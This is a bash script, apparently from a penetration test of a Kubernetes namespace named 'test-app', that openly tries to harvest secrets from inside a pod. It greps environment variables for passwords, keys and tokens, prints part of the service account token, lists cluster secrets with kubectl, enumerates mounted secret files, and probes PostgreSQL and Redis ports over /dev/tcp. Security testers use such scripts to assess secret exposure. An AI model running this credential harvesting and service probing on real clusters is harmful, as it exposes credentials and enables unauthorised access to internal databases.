#!/bin/bash

echo "[+] Attempting to extract secrets from K8s cluster"

# Environment variables
echo "[*] Environment variables:"
env | grep -i -E "(password|secret|key|token)" || echo "[-] No secrets in env"

# Kubernetes service account
echo "[*] Service account token:"
if [ -f "/var/run/secrets/kubernetes.io/serviceaccount/token" ]; then
    echo "[!] Service account token found:"
    head -c 50 /var/run/secrets/kubernetes.io/serviceaccount/token
    echo "..."
else
    echo "[-] No service account token"
fi

# ConfigMaps and Secrets (if kubectl available)
echo "[*] Trying to access K8s secrets..."
kubectl get secrets -n test-app 2>/dev/null && echo "[!] Can access secrets" || echo "[-] No kubectl access"

# Check for mounted secrets
echo "[*] Mounted secrets:"
find /var/run/secrets/ -type f 2>/dev/null | head -10

# Database connection attempts
echo "[*] Testing database connections..."
for host in postgres postgres.test-app.svc.cluster.local localhost; do
    echo "Testing $host:5432"
    timeout 3 bash -c "</dev/tcp/$host/5432" 2>/dev/null && echo "[!] PostgreSQL accessible on $host" || echo "[-] No connection to $host"
done

# Redis connection attempts
for host in redis redis.test-app.svc.cluster.local localhost; do
    echo "Testing $host:6379"
    timeout 3 bash -c "</dev/tcp/$host/6379" 2>/dev/null && echo "[!] Redis accessible on $host" || echo "[-] No connection to $host"
done
